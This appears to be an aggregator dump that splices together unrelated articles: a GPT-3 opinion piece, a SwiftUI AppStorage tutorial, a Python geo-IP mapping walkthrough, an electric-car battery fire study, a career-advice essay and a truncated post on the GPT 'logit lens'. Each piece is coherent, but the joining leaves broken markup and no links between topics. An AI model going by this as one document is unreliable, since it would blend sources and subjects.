<p>As I write this, <strong><a href="https://onezero.medium.com/gpt-3-is-an-amazing-research-tool-openai-isnt-sharing-the-code-d048ba39bbfd" target="_blank" rel="noreferrer noopener">OpenAI refuses to give away the source code despite its goal of transparency</a></strong>. The official reason? This technology is too big and greedy for people to run it themselves. They put it behind <a href="https://beta.openai.com/" target="_blank" rel="noreferrer noopener">a paywall</a> that allows OpenAI to monetize its research.</p>



<p>Two months after the first appearance of GPT-3, most people agree on one thing. <a href="https://www.forbes.com/sites/robtoews/2020/07/19/gpt-3-is-amazingand-overhyped/#36405ce81b1c" target="_blank" rel="noreferrer noopener"><strong>GPT-3 is as superb as overrated.</strong></a> And this is especially true for developers.</p>



<h3>Overhyped</h3>



<p>GPT-3 is super impressive. It’s a great tool to do a lot of things. <strong>But the important thing to understand is that <a href="https://www.technologyreview.com/2020/08/22/1007539/gpt3-openai-language-generator-artificial-intelligence-ai-opinion/" target="_blank" rel="noreferrer noopener">GPT-3 doesn’t understand anything it produces</a></strong>. It makes a mathematical prediction that certain letters should appear in a certain order.</p>



<p><strong>A developer’s job is infinitely more complicated.</strong> Developing a complete application that meets a human need requires a lot of thought. No algorithm has the ability to think about problems the way humans do. No thinking, no reasoning ability, no nothing…</p>



<figure><img src="https://i.ytimg.com/vi/ZVSbJQuPouw/maxresdefault.jpg" data-src="https://i.ytimg.com/vi/ZVSbJQuPouw/maxresdefault.jpg" alt=""></figure>



<p>Going further in the reflection we realize that <strong>GPT-3 is simply a new tool for developers</strong>. It is almost a new language where the interface would be directly explanations of what needs to be done instead of code.</p>



<p>And it’s quite relevant to compare the instructions given in GPT-3 to code. <strong>GPT-3 doesn’t understand vague requirements.</strong> GPT-3 needs very precise, surgical instructions, or it will produce crap. Where a human being will translate, correct and arrange vague requirements, GPT-3 will just produce crap. Or produce nothing at all.</p>



<p>GPT-3 is the largest look-up table ever created. Superintelligence is another story. It’s anything but today, and Sam Altam, the second founder of OpenAI, says so himself.</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">The GPT-3 hype is way too much. It’s impressive (thanks for the nice compliments!) but it still has serious weaknesses and sometimes makes very silly mistakes. AI is going to change the world, but GPT-3 is just a very early glimpse. We have a lot still to figure out.</p>— Sam Altman (@sama) <a href="https://twitter.com/sama/status/1284922296348454913?ref_src=twsrc%5Etfw">July 19, 2020</a></blockquote>
</div></figure>



<p>And all this, not to mention the many limitations and nonsense that GPT-3 produces every day. So right now, developer are safe. </p>



<h3>What about tomorrow?</h3>



<p>Last year, I posted this article on <a href="https://www.jesuisundev.com/quel-avenir-pour-les-developpeureuses-informatiques/" target="_blank" rel="noreferrer noopener">the future of developers</a> (french version). I’m talking about no-code, low-code, quantum computing and many other nice things. <strong>I made the crazy prediction that in 30 years (that’s a lot) the machine will start to nibble away at some parts of our work.</strong> No replacement, just a nibbling of certain tasks, or even certain parts.</p>



<p>I had been crucified. Insults by email and on Twitter, unsubscribing and disappointment. I left the comments section as is (as always), it’s a beauty.</p>



<p>A year later, GPT-3 makes its appearance and proves that some very simple developer tasks can already be delegated to the machine.</p>



<figure><img src="https://i.imgur.com/i7j0QCj.jpg" data-src="https://i.imgur.com/i7j0QCj.jpg" alt=""></figure>



<p>GPT-3 can’t do anything against the job of developer. <strong>But this technology raises <a href="https://towardsdatascience.com/openais-gpt-3-the-end-of-cargo-cult-programmers-23102f70f855" target="_blank" rel="noreferrer noopener">the skill bar for becoming a developer very slightly</a>.</strong> To do what the machine can’t do on its own.</p>



<p>And if this bar is already rising today, where will it be in 30 years? I’m the first to find the speeches that demonize current IAs ridiculous. But the speeches that talk about an AI as stupid as its feet for eternity seem very naive to me. <strong>Where will be the skill bar needed to beat the machine in 30 years?</strong></p>



<p>I am also well aware that the way we make artificial intelligence today is <a href="https://www.zdnet.com/article/openais-gigantic-gpt-3-hints-at-the-limits-of-language-models-for-ai/" target="_blank" rel="noreferrer noopener">reaching a ceiling</a>. <strong>It would take a new and innovative way of doing artificial intelligence to make sense of my concerns.</strong> How can we be sure that these new ways of doing things will not emerge in the future?</p>



<h3>Epilogue</h3>



<p>For now, the future of programming is programming. Artificial intelligence continues its path, but as long as it doesn’t understand what it does, it’s going to be fine. You just have to put up with the fact that it is capable of more and more destabilizing things. How can you be sure that the article you just read is not written by an artificial intelligence?</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><br> On iOS 14 we have two new property wrappers in SwiftUI: <a href="https://developer.apple.com/documentation/swiftui/appstorage" target="_blank" rel="noopener">AppStorage</a> and <a href="https://developer.apple.com/documentation/swiftui/scenestorage" target="_blank" rel="noopener">SceneStorage</a>. <code>AppStorage</code> is usually used to persist some user specific settings and <code>SceneStorage</code> is designed for state restoration.</p><p><br> It's very easy to use these properties when we want to persist value types that they support out of the box, those are <code>Bool</code>, <code>Int</code>, <code>Double</code>, <code>String</code>, <code>URL</code> and <code>Data</code>. For example, we can save the user's chosen city in a weather app using <code>AppStorage</code>.</p><pre><code><span>struct</span> ContentView: <span>View</span> {
    <span>@AppStorage</span>(<span>"city"</span>) <span>var</span> city = <span>""</span>

    <span>var</span> body: <span>some</span> <span>View</span> {
        <span>TextField</span>(<span>"Enter your city"</span>, text: $city)
    }
}
</code></pre><p><br> But we need to do a bit more work if we want to save a type that is not supported by <code>AppStorage</code> or <code>SceneStorage</code> by default. They both have initializers that accept a <a href="https://developer.apple.com/documentation/swift/rawrepresentable" target="_blank" rel="noopener">RawRepresentable</a> where RawValue is of type <code>Int</code> or <code>String</code>. So we would need to add conformance to <code>RawRepresentable</code> to our custom type.</p><p><br> It's important to note though that we shouldn't be using <code>AppStorage</code> and <code>SceneStorage</code> as a replacement for a database, they are designed to save small pieces of data. But sometimes an app setting or a view state are represented by a custom type and this would be the use case described in this article.</p><p><br> As an example, we will look at a recipe app where the users can pin up to 3 recipes to the top of the list. You can get the full code for the example project from <a href="https://github.com/LostMoa/SwiftUI-Code-Examples/blob/main/SaveCustomCodableTypesInAppStorageOrSceneStorage/SaveCustomCodableTypesInAppStorageOrSceneStorage.swift" target="_blank" rel="noopener">GitHub</a>.</p><p><img src="https://lostmoa.com/static/blog/SaveCustomCodableTypeInAppStorageOrSceneStorage/AppScreenshot1.bTTXhDqwYkZOpDi5NSMvqJA2HcN0r-wP_o7zN7jM-4w.png" srcset="https://lostmoa.com/static/blog/SaveCustomCodableTypeInAppStorageOrSceneStorage/AppScreenshot1@2x.nG4t2IwD6dS4_8f-xzWxtS8jMBZ_svjM-E0e3WZAnYU.png 2x, https://lostmoa.com/static/blog/SaveCustomCodableTypeInAppStorageOrSceneStorage/AppScreenshot1@3x.mAaEKB-NAqgllCDMFLK5Q1wBj9R-AcVgA3pKgm87gv8.png 3x" alt="Recipe app screenshot">

</p><p><br> The pinned recipes in our case are a user setting that should be persisted for the whole app, not per scene, so we will be using <code>AppStorage</code>. But the approach with <code>RawRepresentable</code> conformance can be used for <code>SceneStorage</code> as well.</p><p><br> Our custom type to be saved in <code>AppStorage</code> is an Array of <code>UUID</code>s which is <code>Codable</code> by default. You might need to add <a href="https://developer.apple.com/documentation/swift/codable" target="_blank" rel="noopener">Codable</a> conformance to your type manually.</p><pre><code><span>typealias</span> PinnedRecipes = [<span>UUID</span>]
</code></pre><p><br> Now we need to add <a href="https://developer.apple.com/documentation/swift/rawrepresentable" target="_blank" rel="noopener">RawRepresentable</a> conformance to our custom <code>Codable</code> type. Remember, that <code>AppStorage</code> only supports <code>RawRepresentable</code> where the RawValue <code>associatedtype</code> is of type <code>Int</code> or <code>String</code>. So the <code>rawValue</code> property has to return an <code>Int</code> or a <code>String</code>.</p><pre><code><span>extension</span> <span>PinnedRecipes</span>: <span>RawRepresentable</span> {
    <span>public init</span>?(rawValue: <span>String</span>) {
        <span>guard let</span> data = rawValue.<span>data</span>(using: .<span>utf8</span>),
            <span>let</span> result = <span>try</span>? <span>JSONDecoder</span>().<span>decode</span>(<span>PinnedRecipes</span>.<span>self</span>, from: data)
        <span>else</span> {
            <span>return nil</span>
        }
        <span>self</span> = result
    }

    <span>public var</span> rawValue: <span>String</span> {
        <span>guard let</span> data = <span>try</span>? <span>JSONEncoder</span>().<span>encode</span>(<span>self</span>),
            <span>let</span> result = <span>String</span>(data: data, encoding: .<span>utf8</span>)
        <span>else</span> {
            <span>return</span> <span>"[]"</span>
        }
        <span>return</span> result
    }
}
</code></pre><p><br> Once our type conforms to <code>RawRepresentable</code> we can use it with <code>AppStorage</code> or <code>SceneStorage</code>.</p><pre><code><span>struct</span> ContentView: <span>View</span> {
    <span>@AppStorage</span>(<span>"pinnedRecipes"</span>) <span>var</span> pinnedRecipes = <span>PinnedRecipes</span>()
    
    <span>var</span> body: <span>some</span> <span>View</span> {
        <span>List</span> {
            <span>Section</span>(header: <span>Text</span>(<span>"Pinned Recipes"</span>)) {
                <span>ForEach</span>(pinnedRecipes, id: \.<span>self</span>) { id <span>in</span>
                    ...
                }
            }
        }
    }
}
</code></pre><p><br> You can use this approach to save a custom struct, a dictionary or an enum with associated values.</p><p><br> Feel free to take the full code for the example project from <a href="https://github.com/LostMoa/SwiftUI-Code-Examples/blob/main/SaveCustomCodableTypesInAppStorageOrSceneStorage/SaveCustomCodableTypesInAppStorageOrSceneStorage.swift" target="_blank" rel="noopener">GitHub</a> and experiment.</p></div></div>]]>

September 2, 2020 | https://blog.reconinfosec.com/visualizing-geo-ip-information-in-python/ | <a href="https://web.archive.org/web/*/https://blog.reconinfosec.com/visualizing-geo-ip-information-in-python/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<!--kg-card-begin: markdown--><p>As part of the <a href="https://twitter.com/hashtag/OpenSOC">#OpenSOC</a> event Recon InfoSec recently conducted, we wanted to visualize where all of our participants were coming from. We had several data points to work from, and there are plenty of open tools available, so it is just a matter of cobbling those items together to create a sweet, sweet map.</p>
<h2 id="geolocatingipaddresses">Geolocating IP addresses</h2>
<p>A simple resource we found for mapping a physical location to an IP address are the free <a href="https://dev.maxmind.com/geoip/geoip2/geolite2/">Maxmind databases</a>. Maxmind provides their "GeoLite2" databases for the cost of creating an account. For example, in our case, we wanted to draw a world map indicating where participants were coming from. Maxmind provides a <em>Country</em> database which we downloaded and queried against.</p>
<p>They also provide a solid <a href="https://github.com/maxmind/GeoIP2-python">Python library on Github</a> which you can use to easily interact with the databases.</p>
<p>In this case we use the database and Python module as such:</p>
<pre><code>import geoip2.database
reader = geoip2.database.Reader('GeoLite2-Country.mmdb')
iso_code = reader.country(ip_address).country.iso_code
</code></pre>
<p>This returns an <em>Alpha-2</em> <a href="https://en.wikipedia.org/wiki/List_of_ISO_3166_country_codes">ISO code</a> which we can later use to fill a map.</p>
<h3 id="converttoiso3">Convert to ISO-3</h3>
<p>The <a href="https://plotly.com/graphing-libraries/">plotly</a> map we are using <a href="https://plotly.com/python-api-reference/generated/plotly.express.choropleth.html#plotly.express.choropleth">requires the ISO-3/Alpha-3 code</a> versus the Alpha-2 code generated from Maxmind. Luckily, there is a module for this conversion: <a href="https://pypi.org/project/pycountry/">pycountry</a>.</p>
<pre><code>import pycountry

alpha_3 = pycountry.countries.get(alpha_2=iso_code).alpha_3
</code></pre>
<p>If we bin these codes together, we have a distribution of participants by country:</p>
<pre><code>if alpha_3 not in iso_codes:
  iso_codes[alpha_3] = 0
iso_codes[alpha_3] += 1
</code></pre>
<h2 id="whataboutvpns">What about VPNs?</h2>
<p>We assumed, given our audience, that many of our security conscious participants would be using a VPN of some sort. Maxmind provides an <em>Anonymous IP</em> database which aims to tackle exactly this situation, but since WE LOVE OPEN SOURCE EVERYTHING!!, we wanted to figure this out via other methods. There are several Github repos which attempt to tackle this in several different ways.</p>
<h3 id="asnchecking">ASN checking</h3>
<p>If an IP address is originating from Amazon or Google Cloud, there is a reasonable probability that the endpoint is a VPC terminating a VPN. So, let's try to find the ASNs for our IPs, and maps those against known cloud provider ASNs. Again, Maxmind offers a database for mapping IP to ASN.</p>
<pre><code>reader = geoip2.database.Reader('GeoLite2-ASN.mmdb')
response = reader.asn(ip_address)
org = response.autonomous_system_organization
number = response.autonomous_system_number
</code></pre>
<p>ASNs don't tell us much without context, but there are several Github repos which maintain a mapping of Cloud/Colo ASNs (e.g. <a href="https://github.com/brianhama/bad-asn-list">https://github.com/brianhama/bad-asn-list</a>). Find one to your liking, and use it to get a better idea of which addresses may be coming from a cloud provider.</p>
<pre><code>if str(number) in cloud_asns:
  if org not in likely_vpns:
    likely_vpns[org] = 0
  likely_vpns[org] += 1
</code></pre>
<p>Additionally, a simple keyword search will reveal some of the bigger players:</p>
<pre><code>for org in as_organizations:
  if any(keyword in org.lower() for keyword in ["google-cloud", "aws", "amazon"]):
    if org not in likely_vpns:
      likely_vpns[org] = 0
    likely_vpns[org] += 1
</code></pre>
<p>At the end of this process, we have a binned grouping of ASNs with count.</p>
<h3 id="knownvpntorips">Known VPN/TOR IPs</h3>
<p>There are also instances of known VPN services and Tor exit nodes which may not appear in these lists and are unrelated to ASNs. For example <a href="https://github.com/ejrv/VPNs">https://github.com/ejrv/VPNs</a> provides a list of these IP addresses and the Tor Project maintains a list of exit nodes at <a href="https://check.torproject.org/torbulkexitlist">https://check.torproject.org/torbulkexitlist</a>. We can grab these lists and check the IP addresses against them as well.</p>
<pre><code>with open("tor_list.txt", "r") as f:
  tor_ips = f.read().splitlines()

if ip_address in tor_ips:
  if "tor" not in likely_vpns:
    likely_vpns["tor"] = 0
  likely_vpns["tor"] += 1
</code></pre>
<p>At this point, we have a decent list of addresses we should exclude from the country mapping results.</p>
<h2 id="preparingamap">Preparing a map</h2>
<p>We chose to use the <a href="https://plotly.com/graphing-libraries/">Plotly Graphing Libraries</a> to build a "<a href="https://en.wikipedia.org/wiki/Choropleth_map">Choropleth</a>" (think "map colored by value") (and a new term I frequently use to sound smart.)</p>
<p>In order to draw a map, you need to provide the graphing library a set of geospatial data which draws the borders, etc. These are often available as a <code>.json</code> file (e.g. <a href="https://github.com/topojson/world-atlas">https://github.com/topojson/world-atlas</a>) which plotly can ingest. We now have a list of countries and the appropriate data to start building a map.</p>
<h2 id="mapping">Mapping</h2>
<p>As an output from the previous steps, stored the data as a simple <code>.csv</code> which looked something like:</p>
<pre><code>Country,Particpants
USA,400
</code></pre>
<p>Plotly has a requirement for the <a href="https://pandas.pydata.org/">pandas</a> library so it is easy to read this data in:</p>
<pre><code>import pandas as p

df = p.read_csv("countries.txt", names=("country", "participants"))
</code></pre>
<p>Then we can read in the aforementioned geo data:</p>
<pre><code>import json

countries = {}
with open("countries.geo.json", "r") as f:
  countries = json.load(f)
</code></pre>
<p>With our data loaded, we can now build the map:</p>
<pre><code>fig = px.choropleth(df.sort_values(by=["participants"], ascending=False), 
    geojson=countries,
    locations="country",
    color="participants",
    range_color=(0, max(df["participants"])),
    scope="world",
    projection="natural earth",
    hover_data=["participants"])
</code></pre>
<p>Let's walk through some of the parameters listed there:</p>
<ul>
<li><code>df.sort_values(by=["participants"], ascending=False)</code>: <code>df</code> is our pandas dataframe (the data) and we want to sort it descending by the number of participants (per country)</li>
<li><code>geojson=countries</code>: <code>countries</code> is our geospatial data we read in earlier which helps plotly draw the borders</li>
<li><code>locations="country"</code>: this is the parameter plotly uses to color. E.g. is uses the "Alpha-3" values in the <code>country</code> column to color the individual locations present in the data</li>
<li><code>color="participants"</code>: this colors each location (country) based on the number of participants
<ul>
<li>Option 2: <code>color="country"</code>: this will color each country as a discrete color versus on a scale</li>
</ul>
</li>
<li><code>range_color=(0, max(df["participants"]))</code>: the range for the colors should span 0 to the maximum number of participants
<ul>
<li>Note: This gets a little wonky if you have an outlier on the upper end.</li>
</ul>
</li>
<li><code>scope="world"</code>: we want a world map</li>
<li><code>projection="natural earth"</code>: use a rounded projection vs a big, flat box projection</li>
<li><code>hover_data=["participants"]</code>: plotly automatically creates a pretty sweet interactive map. This allows us to see the participant count when we hover over a country</li>
</ul>
<p>There are a TON of customization and configuration options available so you can bend the map to your will.</p>

What happens if an electric car burns in a road tunnel or an underground car park? In the Hagerbach test tunnel in Switzerland, 

Swiss Federal Laboratories for Materials Science and Technology (Empa) researchers and tunnel safety expert Lars Derek Mellert set fire to battery cells of electric cars, analyzed the distribution of soot and smoke gases and the chemical residues in the extinguishing water.<br></p><p>

There’ s a loud bang, and then it starts: A battery module of an electric car is on fire in the Hagerbach test tunnel. A video of the test impressively shows the energy stored in such batteries: Meter-long flames hiss through the room and produce enormous amounts of thick, black soot. The visibility in the previously brightly lit tunnel section quickly approaches zero. After a few minutes, the battery module is completely burnt out. Ash and soot have spread throughout the room.</p><figure data-orig-width="870" data-orig-height="489"><img src="https://64.media.tumblr.com/2b820939012f3d0ea9aff8f623a876f8/41facb633e73cb10-a2/s1280x1920/6103e7a227800753c33a530cf7f81f5c4f35d503.jpg" alt="image" data-orig-width="870" data-orig-height="489" width="870" height="489"></figure><p><i>Image:&nbsp;During a fire, a battery module of an electric car develops large amounts of soot, which contains toxic metal oxides.

The results have just been published. “In our experiment we were considering in particular private and public operators of small and large underground or multi-story car parks,” says project leader Lars Derek Mellert of Amstein + Walthert Progress AG. “All these existing underground structures are being used to an increasing extent by electric cars. And the operators ask themselves: What to do if such a car catches fire? What are the health risks for my employees? What effects does such a fire have on the operation of my plant?” But until now there has been hardly any meaningful technical literature, let alone practical experience for such a case. </p><p>With the support of battery researcher Marcel Held and corrosion specialist Martin Tuchschmid from Empa, Mellert developed three test scenarios. Experts from the Hagerbach AG test tunnel and the French Centre d'études des tunnels (CETU) in Bron were also involved. “We installed test surfaces in the fire tunnel on which the soot settled,” explains Martin Tuchschmid, corrosion and fire damage specialist at Empa. “After the test, the surfaces were chemically analyzed and also stored in special rooms for several months to detect possible corrosion damage.”</p><h2><b> Scenario 1: Fire in an enclosed space</b></h2><p>The first scenario involves a fire in a closed car park without mechanical ventilation. A parking space of 28 x 28 meters area and 2.5 meters floor height was assumed. Such a floor would have an air volume of 2000 cubic meters. The fire of a small car with a fully charged battery of 32 kWh is assumed. For reasons of test economy everything was scaled down to 1/8. Thus, a fully charged battery module with 4 kWh capacity was set on fire in a room with 250 cubic meters of air volume. The tests investigated how the soot settles on tunnel walls, surfaces and on protective suits worn by firefighters on site, how toxic the residues are and by what means the fire site can be cleaned after the event.</p><h2><b>Scenario 2: Fire in a room with sprinkler system</b></h2><p>Scenario 2 deals with chemical residues in the extinguishing water. The test set-up was the same as in scenario 1. But this time, the smoke from the battery was channeled with the aid of a metal plate beneath a water shower that resembled a sprinkler system. The sooty water that rained down was collected in a basin. The battery was not extinguished, but burned out completely.

Scenario 3: Fire in a tunnel with ventilation</b></h2><p>In this scenario, the focus of the study lay on the effect of such a fire on a ventilation system. How far is the soot distributed in the exhaust ducts? Do substances that would cause corrosion settle there? In the experiment, a 4 kWh battery module was again set on fire, but this time a fan blew the smoke at a constant speed into a 160-meter-long ventilation tunnel. At a distance of 50, 100 and 150 meters from the site of the fire, the researchers had installed metal sheets in the tunnel where the soot would settle. The chemical composition of the soot and possible corrosion effects were analyzed in the Empa laboratories. </p><p>The results of the test were <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fplus.empa.ch%2Fimages%2F2020-08-17_Brandversuch-Elektroauto%2FAGT_2018_006_EMob_RiskMin_Undergr_Infrastr_Final_Report_V1.0.pdf&amp;t=YzA3N2RiMWE2ZDZhMWM3MGEyOWVmNDQzY2EzOGRlYzNkNWRiMDNmZixPZWJKY2JoYg%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F628179785660694528%2Fhow-dangerous-are-burning-electric-cars&amp;m=0&amp;ts=1599295440">published in a final report</a> in August 2020. Project leader Mellert reassures: In terms of heat development a burning electric car is not more hazardous than a burning car with a conventional drive. “The pollutants emitted by a burning vehicle have always been dangerous and possibly fatal,” says the final report. Regardless of the type of drive or energy storage system, the primary objective has to be to get everyone out of the danger zone as quickly as possible. The highly corrosive, toxic hydrofluoric acid has often been discussed as a particular danger in burning batteries. In the three tests in the Hagerbach tunnel, however, the concentrations remained below critical levels. </p><p>Conclusion: A tunnel ventilation system that is state-of-the-art can cope not only with burning gasoline/diesel cars, but also with electric cars. Increased corrosion damage to the ventilation system or the tunnel equipment is also unlikely based on the results now available.</p><p>Even the fire brigades do not have to learn anything new on the basis of the tests. Firefighters know that the battery of an electric car is impossible to extinguish and that it can only be cooled with large amounts of water. So the fire can possibly be limited to a few battery cells, and part of the battery will not burn out. Of course, such a partially burnt wreck must be stored in a water basin or a special container so that it cannot reignite. But this is already known to the specialists and is being practiced.</p><figure></figure><p><i>Video:&nbsp;“The experiment: Torching a battery - When electrical vehicles catch fire” by EmpaChannel, <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fyoutu.be%2F2O07SIaxB08&amp;t=MWEwMWE3OTI3MzY3ZWM3NjE4ODZkNmM5MDM2MWJjZDZjYWZhMTVhZixPZWJKY2JoYg%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F628179785660694528%2Fhow-dangerous-are-burning-electric-cars&amp;m=0&amp;ts=1599295440">YouTube</a>.</i></p><h2><b>The extinguishing water is poisonous</b></h2><p>A problem, however, is the extinguishing and cooling water that is produced when fighting such a fire and storing a burnt-out battery in a water basin. The analyses showed that the chemical contamination of the extinguishing water exceeds the Swiss threshold values for industrial wastewater by a factor of 70; the cooling water is even up to 100-times above threshold values. It is important that this highly contaminated water does not enter the sewage system without proper treatment.&nbsp;</p><h2><b>Professional decontamination mandatory</b></h2><p>After the trials, the tunnel was decontaminated by a professional fire clean-up team. Samples taken subsequently confirmed that the methods and time required were sufficient for the clean-up after an electric car fire. But Mellert warns especially private owners of underground garages: “Do not try to clean up the soot and dirt yourself. The soot contains large amounts of cobalt oxide, nickel oxide and manganese oxide. These heavy metals cause severe allergic reactions on unprotected skin.” So clean-up after an electric car fire is definitely a job for professionals in protective suits.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span><p>From time to time newly graduated hackers ask me: <em>“Do you have any advice for beginning my career?”</em></p><p>I’ve found myself repeating 3 principles over and over again. On reflection, I realized these principles apply more broadly. I <em>think</em> they might answer the question <em>“Do you have any advice on for beginning my life as an adult?”</em></p><p>I thought I’d share these ideas with you here. The style and the examples I wrote are career-oriented, but I think the core ideas will still help in your decision making. I hope you enjoy them : ).</p><p><em>What should you do?</em> is one of the hardest questions to answer when you start out.</p><p>The default path is to follow what’s popular or prestigious. That can lead to a bunch of problems: What’s prestigious is already highly competitive. When you compete with smart people in a game that has established rules, just keeping up will take most of your time. That leaves little time to explore what interests you. When you don’t explore what interests you, you won’t understand things as deeply, and that leaves you with an undifferentiated skillset.</p><p><strong>The solution here is to follow your taste.</strong> Popularity and prestige are lagging indicators. Your taste, especially as a young, curious person, is a signal for <em>what will be</em> popular in the future. Regardless though, when you follow you taste, you’ll find yourself much more interested in the problems you’re solving. When you’re interested in the problems you’re solving, you’ll discover deeper truths, build deeper expertise, a differentiated skillset, and have more fun along the way.</p><p>Now, you may be wondering: <strong>What if you don’t even know what you’re interested in?</strong></p><p>Don’t worry. You just need to tune into and strengthen your taste. To do that, just do <em>anything</em>. Once you do <em>anything</em>, ask yourself, what part of that thing do you  find interesting?</p><p>Start going deeper there, and all of a sudden, you’ll discover a wealth of interests.</p><p>Next up, you may be wondering: <strong>What if your interests keep changing?</strong></p><p>Don’t worry. It’s totally fine. Just follow it. You’ll be surprised how things will serve you down the road. As long as you’re working hard and you’re learning, it’s a good use of time.</p><p>You may also wonder: <strong>What if your interests <em>are</em> what’s popular and prestigious today?</strong></p><p>That’s great. Follow that, but instead of competing, start sensing what actually interests you in that field and go deeper.</p><p>The ideas may seem career oriented, so you may be wondering: <strong>What if I just want to travel and explore the world?</strong></p><p>That’s great too! It’s your taste, telling you that you want to travel. Follow it and see where it leads you.</p><p>As you discover your interests, you may find that they’re not necessarily popular. Yet, when you go deeper and do your thing, something magical will happen…which leads us into the second principle:</p><p>As you explore and follow your taste, you’ll discover a subset of people who share your core interests and values.</p><p>Nurture those relationships. Some of these people will be your friends for life. Many of those people will become very successful in the future.</p><p>The people you know will show you what’s possible and work alongside you in deepening, exploring, and innovating on your shared interests.</p><p>You may be wondering: <em>what if you live in the middle of nowhere, and there aren’t people who get you?</em> Do your best to go to the center of wherever your community is. That may be SF for hackers or Los Angeles for entertainers or Paris for artists, the list goes on. You know where it is for you.</p><p>Now, this may sound impractical to you, but you’ll be surprised with what you can do. You can start off online in the meantime.</p><p>One common pitfall here is <em>focusing only on successful people in your field.</em> This misses the point. Sure, reach out to those successful people, but remember that the young, curious, interested people right next you, <em>will become those successful people in the future.</em> You have tons of time to spend together, so it’s great way to deepen your relationships. I’m not saying that you shouldn’t reach out to successful people (you definitely should), but to remove “success” as a criteria altogether for choosing who you spend your time with.</p><p>Now, you may be wondering, <em>how do you deepen those relationships?</em> That leads to us to the third principle:</p><p>As you form your community, new ideas and ways to collaborate will spring up. Take those opportunities: work together, support each-other and play. Over time, which you have a lot of right now, you will form a tight tribe of friends.</p><p>As a happy side effect, you’ll become exposed to new fields, new technologies, interesting problems, and interesting opportunities. Start taking them, and you’re well on your way to a career that’s <em>made for you.</em></p><p>One common issue here is a lack of self belief. This may lead you into choosing what you think “you are capable of”, rather than what you’re interested in. One way to get around this is to just experiment: let yourself dream and work with your friends, even if the problems seem fantastically hard.</p><p>There are a lot of examples I can give you if you’re interested in what I’m interesting in: From <a href="https://m.stopa.io/my-favorite-books-11e6b5a3ac0a" target="_blank">my favorite books</a> to <a href="http://www.paulgraham.com/articles.html" target="_blank">Paul Graham’s essays</a> to <a href="https://www.amazon.com/Paradigms-Artificial-Intelligence-Programming-Studies/dp/1558601910" target="_blank">Norvig’s Paradgims of AI programming</a>, to <a href="https://m.stopa.io/favorite-rich-hickey-talks-6bcb23da6ff2" target="_blank">Rich Hickey talks</a>. But, instead I encourage you to think: <em>what interests you right now?</em></p><p>If you’re up for it, I’d love to know your answer: <strong><em>what interests you right now?</em></strong> Feel free to leave your answer in the comments or to email me directly, I’d be curious to hear : )</p><p>There’s a slew of people who have influenced and mentored me. These ideas are just as much them as me.</p><p>On the idea of taste specifically, the big shoutout has to go to Paul Graham. A lot of my thinking about this was inspired by reading his essays over and over when I started out. I highly suggest reading them.</p><p><em>Thanks to Daniel Woelfel, Talha Baig, Martin Raison, Irakli Safareli, David Magaltadze, Joe Averbukh, Julien Odent, for reviewing this essay</em></p></span></p></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>This post relates an observation I've made in my work with GPT-2, which I have not seen made elsewhere.</p><p>IMO, this observation sheds a good deal of light on how the GPT-2/3/etc models (hereafter just "GPT") work internally.</p><p>There is an accompanying <a href="https://colab.research.google.com/drive/1-nOE-Qyia3ElM17qrdoHAtGmLCPUZijg?usp=sharing">Colab notebook</a> which will let you interactively explore the phenomenon I describe here.</p><p>[Edit: updated with another section on comparing to the inputs, rather than the outputs.  This arguably resolves some of my confusion at the end.  Thanks to algon33 and Gurkenglas for relevant suggestions here.]</p><ul><li>GPT's probabilistic predictions are a linear function of the activations in its final layer.  If one applies the same function to the activations of <em>intermediate </em>GPT layers, the resulting distributions make intuitive sense.</li><ul><li>This "logit lens" provides a simple (if partial) interpretability lens for GPT's internals.</li><li>Other work on interpreting transformer internals has focused mostly on what the attention is looking at.  The logit lens focuses on <em>what</em> GPT "believes" after each step of processing, rather than <em>how</em> it updates that belief inside the step.</li></ul><li>These distributions gradually converge to the final distribution over the layers of the network, often getting close to that distribution long before the end.</li><ul><li>At some point in the middle, GPT will have formed a "pretty good guess" as to the next token, and the later layers seem to be refining these guesses in light of one another.</li><li>The general trend, as one moves from earlier to later layers, is </li><ul><li>"nonsense / not interpretable" (sometimes, in very early layers) --&gt; </li><li>"shallow guesses (words that are the right part of speech / register / etc)" --&gt;</li><li>"better guesses"</li></ul><li>...though some of those phases are sometimes absent.</li></ul><li>On the other hand, o<em>nly </em>the inputs look like the input tokens.</li><ul><li>In the logit lens, the early layers sometimes look like nonsense, and sometimes look like very simple guesses about the output.  They almost never look like the input.</li><li>Apparently, the model does not "keep the inputs around" for a while and gradually process them into some intermediate representation, then into a prediction.</li><li>Instead, the inputs are <em>immediately </em>converted to a very different representation, which is smoothly refined into the final prediction.</li></ul><li>This is reminiscent of the perspective in <a href="https://arxiv.org/abs/1807.03819">Universal Transformers </a>which sees transformers as iteratively refining a guess.</li><ul><li>However, Universal Transformers have both an encoder and decoder, while GPT is only a decoder.  This means GPT faces a tradeoff between keeping around the input tokens, and producing the next tokens.</li><li><em>Eventually</em> it has to spit out the next token, so the longer it spends (in depth terms) processing something that looks like token <em>i, </em>the less time it has to convert it into token <em>i+1</em>.  GPT has a deadline, and the clock is ticking.</li></ul><li>More speculatively, this suggests that GPT mostly "thinks in predictive space," immediately converting inputs to predicted outputs, then refining guesses in light of other guesses that are themselves being refined.</li><ul><li>I think this might suggest there is some fundamentally better way to do sampling from GPT models?  I'm having trouble writing out the intuition clearly, so I'll leave it for later posts.</li></ul><li>Caveat: I call this a "lens" because it is one way of extracting information from GPT's internal activations.  I imagine there is other information present in the activations that cannot be understood by looking at logits over tokens.  The logit lens show us some of what is going on, not all of it.</li></ul><p>You can skip or skim this if you already know it.</p><ul><li> Input and output</li><ul><li>As <em>input,</em> GPT takes a sequence of tokens. Each token is a single item from a vocabulary of <em>N_v</em>=50257 byte pairs (mostly English words).</li><li>As <em>output,</em> GPT returns a probability distribution over the vocabulary. It is trained so this distribution predicts the next token.</li><li>That is, the model's outputs are shifted forward by one position relative 